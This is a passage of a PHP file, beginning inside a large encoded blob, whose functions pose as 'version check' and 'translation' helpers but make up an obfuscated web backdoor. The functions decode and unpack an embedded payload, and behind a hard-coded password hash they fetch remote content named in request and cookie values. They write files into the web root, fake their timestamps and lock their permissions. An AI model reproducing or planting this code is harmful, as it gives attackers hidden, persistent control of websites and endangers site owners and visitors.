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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("bkslfaet{$check}p", 'a616fff3823206c03dee78316aa371b4')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}